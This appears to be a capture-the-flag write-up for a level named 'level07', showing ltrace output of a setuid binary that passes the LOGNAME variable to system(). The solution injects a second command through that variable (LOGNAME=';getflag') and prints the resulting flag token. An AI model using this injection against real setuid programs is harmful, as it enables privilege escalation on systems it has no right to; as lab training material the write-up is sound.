# level07 solution
Given setuid elf, we can run it with ltrace to get the idea of what it is doing:

    getegid()                                                  = 2007
    geteuid()                                                  = 2007
    setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)        = 0
    setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)        = 0
    getenv("LOGNAME")                                          = "level07"
    asprintf(0xbffff724, 0x8048688, 0xbfffff52, 0xb7e5ee55, 0xb7fed280) = 18
    system("/bin/echo level07 "level07

It seems to get string from environment variable LOGNAME and echo it via system run. We can modify this variable to inject our code:
    
    LOGNAME=";getflag" ./level07

Resulting output:

    Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
